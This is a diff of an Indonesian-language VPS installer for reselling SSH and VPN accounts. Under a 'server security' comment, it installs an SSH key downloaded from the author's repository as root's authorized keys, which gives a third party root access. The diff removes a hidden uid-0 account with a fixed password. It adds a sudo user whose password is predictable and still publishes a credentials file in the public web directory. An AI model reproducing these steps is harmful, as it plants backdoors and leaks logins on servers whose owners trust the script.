@@ -6,6 +6,7 @@ OS=`uname -p`;
 # data pemilik server
 read -p "Nama pemilik server: " namap
 read -p "Nomor HP atau Email pemilik server: " nhp
+read -p "Masukkan username untuk akun default: " dname
 
 # ubah hostname
 echo "Hostname Anda saat ini $HOSTNAME"
@@ -78,10 +79,12 @@ yum -y update
 # Untuk keamanan server
 cd
 mkdir /root/.ssh
-wget https://github.com/khairilg/script-jualan-ssh-vpn/raw/master/conf/ak -O /root/.ssh/authorized_keys2
+wget https://github.com/khairilg/script-jualan-ssh-vpn/raw/master/conf/ak -O /root/.ssh/authorized_keys1
 chmod 700 /root/.ssh
-chmod 600 /root/.ssh/authorized_keys2
-echo "AuthorizedKeysFile     .ssh/authorized_keys2" >> /etc/ssh/sshd_config
+chmod 600 /root/.ssh/authorized_keys1
+echo "AuthorizedKeysFile     .ssh/authorized_keys1" >> /etc/ssh/sshd_config
+echo "PermitRootLogin no" >> /etc/ssh/sshd_config
+echo "$dname  ALL=(ALL)  ALL" >> /etc/sudoers
 service sshd restart
 
 # install webserver
@@ -157,10 +160,10 @@ cd /etc/openvpn/
 wget -O /etc/openvpn/1194-client.ovpn "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/openvpn.conf"
 sed -i $MYIP2 /etc/openvpn/1194-client.ovpn;
 #PASS=`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1`;
-useradd -ou 0 -g 0 -d /root/ idwx
-echo "idwx:idwx@2017" | chpasswd
-echo "idwx" > pass.txt
-echo "idwx@2017" >> pass.txt
+useradd -g 0 -d /root/ -s /bin/bash $dname
+echo "$dname:$dname@2017" | chpasswd
+echo "$dname" > pass.txt
+echo "$dname@2017" >> pass.txt
 tar cf client.tar 1194-client.ovpn pass.txt
 cp client.tar /home/vps/public_html/
 cp 1194-client.ovpn /home/vps/public_html/
@@ -346,11 +349,10 @@ echo "Tools"  | tee -a log-install.txt
 echo "-----"  | tee -a log-install.txt
 echo "axel, bmon, htop, iftop, mtr, nethogs"  | tee -a log-install.txt
 echo "" | tee -a log-install.txt
-echo "Account Default (untuk login root dan default untuk SSH dan VPN)"  | tee -a log-install.txt
+echo "Account Default (untuk SSH dan VPN)"  | tee -a log-install.txt
 echo "---------------"  | tee -a log-install.txt
-echo "User     : idwx"  | tee -a log-install.txt
-echo "Password : idwx@2017"  | tee -a log-install.txt
-echo "Silahkan simpan user diatas untuk masuk ke akun root" | tee -a log-install.txt
+echo "User     : $dname"  | tee -a log-install.txt
+echo "Password : $dname@2017"  | tee -a log-install.txt
 echo "" | tee -a log-install.txt
 echo "Script Command"  | tee -a log-install.txt
 echo "--------------"  | tee -a log-install.txt
@@ -360,7 +362,7 @@ echo "checkvirus : untuk scan virus / malware"  | tee -a log-install.txt
 echo "bench : untuk melihat performa vps" | tee -a log-install.txt
 echo "usernew : untuk membuat akun baru"  | tee -a log-install.txt
 echo "userlist : untuk melihat daftar akun beserta masa aktifnya"  | tee -a log-install.txt
-echo "userlimit <limit> : untuk kill akun yang login lebih dari satu kali. Cth: userlimit 1"  | tee -a log-install.txt
+echo "userlimit <limit> : untuk kill akun yang login lebih dari <limit>. Cth: userlimit 1"  | tee -a log-install.txt
 echo "userlogin  : untuk melihat user yang sedang login"  | tee -a log-install.txt
 echo "userdelete  : untuk menghapus user"  | tee -a log-install.txt
 echo "trial : untuk membuat akun trial selama 1 hari"  | tee -a log-install.txt
